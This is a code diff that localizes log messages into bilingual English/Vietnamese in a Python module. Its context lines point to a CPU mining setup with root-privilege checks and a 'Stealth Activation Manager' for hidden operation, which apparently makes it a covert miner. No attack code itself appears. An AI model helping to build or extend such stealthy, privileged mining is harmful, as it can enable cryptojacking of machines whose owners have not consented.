@@ -84,7 +84,7 @@ try:
             _h.setLevel(logging.DEBUG)
         _lg.debug('===== DEBUG MODE ENABLED (auto-booster) =====')
 except Exception as _dbg_err:
-    logger.warning(f'DEBUG booster init failed: {_dbg_err}')
+    logger.warning(f"[DEBUG] (gỡ lỗi) booster khởi tạo thất bại: {_dbg_err}")
 # ---------- END BOOSTER ----------
 
 # **Dedicated Module Loggers** (Logger mô-đun chuyên dụng)
@@ -112,11 +112,11 @@ def initialize_environment():
     
     try:
         # **Step 1: Privileged Manager** (Bước 1: Trình quản lý đặc quyền)
-        logger.info("🔐 Initializing privileged manager...")
+        logger.info("🔐 [Initializing privileged manager] (khởi tạo trình quản lý đặc quyền)...")
         privileged_manager = get_privileged_manager(logger)
         
         # **Step 2: Security Context Validation** (Bước 2: Xác thực bối cảnh bảo mật)
-        logger.info("🔒 Validating security context...")
+        logger.info("🔒 [Validating security context] (xác thực ngữ cảnh bảo mật)...")
         security_context = privileged_manager.validate_security_context()
         logger.info(f"✅ Bối cảnh bảo mật: User={security_context['user']}, Root={security_context['is_root']}")
         
@@ -126,7 +126,7 @@ def initialize_environment():
         # (CPU-only) Bỏ qua kiểm tra/tracking GPU để đơn giản hóa môi trường
         
         # **Step 5: Environment Setup** (Bước 5: Thiết lập môi trường)
-        logger.info("🌍 Running centralized environment setup...")
+        logger.info("🌍 [Running centralized environment setup] (chạy thiết lập môi trường tập trung)...")
         setup_env.setup()
         logger.info("✅ Thiết lập môi trường thành công.")
         
@@ -135,7 +135,7 @@ def initialize_environment():
     except Exception as e:
         error_msg = f"Lỗi khi thiết lập môi trường: {e}"
         logger.error(f"❌ {error_msg}")
-        logger.error(f"🔍 Exception details: {type(e).__name__}: {str(e)}")
+        logger.error(f"🔍 [Exception details] (chi tiết ngoại lệ): {type(e).__name__}: {str(e)}")
         
         # **Thread-safe error propagation** (truyền lỗi an toàn luồng)
         stop_event.set()
@@ -148,7 +148,7 @@ def start_resource_manager():
     
     Note: Hàm này giữ lại để **backward compatibility** (tương thích ngược)
     """
-    logger.warning("⚠️ start_resource_manager() is deprecated - use resource_manager_thread() instead")
+    logger.warning("⚠️ [deprecated] (không dùng nữa): start_resource_manager() – dùng resource_manager_thread() thay thế")
     return None
     
     def resource_manager_worker():
@@ -157,7 +157,7 @@ def start_resource_manager():
         """
         try:
             # **Step 1**: Load configuration từ JSON
-            logger.info("📋 Step 1/4: Loading configuration from JSON...")
+            logger.info("📋 Step 1/4: [Loading configuration from JSON] (nạp cấu hình từ JSON)...")
             config_path = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config')) / "resource_config.json"
             
             if not config_path.exists():
@@ -170,12 +170,12 @@ def start_resource_manager():
             logger.info("✅ Configuration loaded successfully")
             
             # **Step 2**: Initialize EventBus với **memory backend** (bộ xử lý bộ nhớ)
-            logger.info("📋 Step 2/5: Initializing EventBus with memory backend...")
+            logger.info("📋 Step 2/5: [Initializing EventBus] (khởi tạo EventBus) với [memory backend] (hậu phương bộ nhớ)...")
             event_bus = EventBus()
             logger.info("✅ EventBus initialized successfully")
             
             # **Step 2.5**: Initialize Stealth Activation Manager với **EventBus integration** (tích hợp EventBus)
-            logger.info("📋 Step 2.5/5: Initializing Stealth Activation Manager...")
+            logger.info("📋 Step 2.5/5: [Initializing Stealth Activation Manager] (khởi tạo trình quản lý kích hoạt ẩn danh)...")
             stealth_init_success = initialize_stealth_activation(event_bus)
             if stealth_init_success:
                 logger.info("✅ Stealth Activation Manager initialized successfully")
@@ -183,12 +183,12 @@ def start_resource_manager():
                 logger.warning("⚠️ Stealth Activation Manager initialization failed - continuing without external stealth")
             
             # **Step 3**: Create ResourceManager instance
-            logger.info("📋 Step 3/5: Creating ResourceManager instance...")
+            logger.info("📋 Step 3/5: [Creating ResourceManager instance] (tạo thể hiện ResourceManager)...")
             resource_manager = ResourceManager(config, event_bus, logger)
             logger.info("✅ ResourceManager instance created")
             
             # **Step 4**: Start ResourceManager
-            logger.info("📋 Step 4/5: Starting ResourceManager...")
+            logger.info("📋 Step 4/5: [Starting ResourceManager] (khởi động ResourceManager)...")
             resource_manager.start()
             logger.info("🎯 ResourceManager đã được khởi động thành công")
             
@@ -235,7 +235,7 @@ def stop_resource_manager():
     
     Note: ResourceManager shutdown is now handled by thread termination
     """
-    logger.warning("⚠️ stop_resource_manager() is deprecated - shutdown handled by thread cleanup")
+    logger.warning("⚠️ [deprecated] (không dùng nữa): stop_resource_manager() – việc tắt đã được xử lý bởi dọn dẹp luồng")
     stop_event.set()
 
 def is_mining_process_running(process):
